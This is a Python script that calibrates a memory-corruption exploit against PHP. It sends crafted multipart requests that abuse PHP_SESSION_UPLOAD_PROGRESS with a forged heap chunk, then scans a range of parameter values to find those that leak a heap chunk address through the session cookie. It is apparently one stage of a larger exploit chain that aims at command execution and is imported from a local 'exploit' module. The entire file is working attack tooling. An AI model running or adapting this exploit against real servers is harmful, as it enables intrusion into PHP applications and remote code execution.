#!/usr/bin/env python3
"""Calibrate stage1_n for a target: scan a range and report which values produce the heap leak."""
import sys
import time

sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import (Target, Exploit, build_multipart, parse_cookie,
                     chunk_base_from_cookie, SID)

URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18114/index.php"
lo = int(sys.argv[2]) if len(sys.argv) > 2 else 750
hi = int(sys.argv[3]) if len(sys.argv) > 3 else 950
step = int(sys.argv[4]) if len(sys.argv) > 4 else 2

import struct
t = Target(URL, timeout=60.0, verbose=False)

def try_stage1(n, huge_mb=12):
    ex = Exploit(t, "id", htdata_offset=0x690d8, profile="bookworm", huge_mb=huge_mb)
    ex.stage1_n = n
    # request A (priming)
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
              ex._file_part(), ex._big_field()]
    t.post(build_multipart(parts, b"S"*17), b"S"*17, read_cap=9<<20)
    time.sleep(0.2)
    # request B (leak)
    parts = [{"name": "PHPSESSID", "data": SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(n):
        val = (f"v{i:04d}" + "x"*44)[:48]
        parts.append({"name": str(1000+i), "data": val.encode()})
    forge = bytearray(b"A"*79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = t.post(build_multipart(parts, b"B"*10), b"B"*10, read_cap=9<<20)
    cookie = parse_cookie(resp)
    base = chunk_base_from_cookie(cookie)
    return base, len(cookie)

print(f"scanning stage1_n {lo}..{hi} step {step} on {URL}")
hits = []
for n in range(lo, hi+1, step):
    base, clen = try_stage1(n)
    mark = f"LEAK base=0x{base:x} cookie={clen}" if base else f"miss (cookie={clen})"
    print(f"  n={n}: {mark}", flush=True)
    if base:
        hits.append(n)
    time.sleep(0.1)
print("HITS:", hits)
sys.exit(0 if hits else 1)
